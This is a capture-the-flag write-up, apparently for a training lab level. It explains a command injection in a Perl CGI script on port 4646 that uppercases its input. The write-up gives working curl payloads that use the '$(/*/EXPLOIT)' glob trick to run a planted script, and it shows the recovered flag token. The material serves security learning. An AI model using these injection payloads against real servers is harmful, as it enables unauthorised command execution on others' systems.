## Phase 1: Reconnaissance

Upon connecting to the level, we find a single file in the home directory:
- A Perl script

Inspecting the script indicates that it is used by a server running on **port 4646**

To confirm this, we check listening ports:

```bash
ss -lntu
```

We can see that port **4646** is open, confirming that a server is running

---

## Phase 2: Code Analysis

The Perl script appears intentionally obfuscated, so we rename variables and simplify it to better understand the logic:

```perl
  $argv1 = $_[0];          # (comes from ?=x in URL)

  $argv1 =~ tr/a-z/A-Z/;   # force uppercase
  $argv1 =~ s/\s.*//;      # cut at first whitespace (keep only first "word")

  @grep_lines = `egrep "^$argv1" /tmp/xd 2>&1`;  # run argv1 in shell
```

From this code we observe:
- User input comes directly from the `x` URL parameter
- The input is forced to **uppercase**
- The input is passed directly into a shell command via backticks

This immediately suggests a **command injection vulnerability**

---

## Phase 3: Exploitation

We first attempt a simple command injection:

```bash
curl -G -v --data-urlencode 'x=$(whoami > /tmp/test)' localhost:4646/
```

But nothing appears in `/tmp/test`...

Looking back at the code, this explains why:
- All input is converted to uppercase
- The payload becomes `WHOAMI > /TMP/TEST`
- Linux paths and commands are case-sensitive, so the command fails

---

Since lowercase commands cannot be executed directly, we need another solution

The idea is to:
- Give it an uppercase file that triggers a lowercase payload
- Basically command substitution

So we create a file named `EXPLOIT` containing our payload:

```bash
echo "whoami > /tmp/result" > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
```

We then try to execute it:

```bash
curl -G -v --data-urlencode 'x=$(/tmp/EXPLOIT)' localhost:4646/
```

This fails again, because `/tmp/EXPLOIT` becomes `/TMP/EXPLOIT`, and `/TMP` does not exist

---

## Phase 4: Solution

To bypass this forced uppercase transformation, we use a wildcard `*` which will run every `EXPLOIT` file under `/`

Example for `/*/EXPLOIT`:
```console

/     *     /EXPLOIT

/ = root directory
* = any folder name
EXPLOIT = any file called EXPLOIT
```


- So using `*` we can execute any file named `EXPLOIT` inside any directory:

```bash
curl -G -v --data-urlencode 'x=$(/*/EXPLOIT)' localhost:4646/
```

After running this, we check the result:

```bash
cat /tmp/result
```

Output:

```txt
flag12
```

This confirms that the payload worked !

---

We now replace the payload with `getflag`:

```bash
echo "getflag > /tmp/result" > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
```

Trigger the exploit again:

```bash
curl -G -v --data-urlencode 'x=$(/*/EXPLOIT)' localhost:4646/
cat /tmp/result
```

Output:

```txt
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
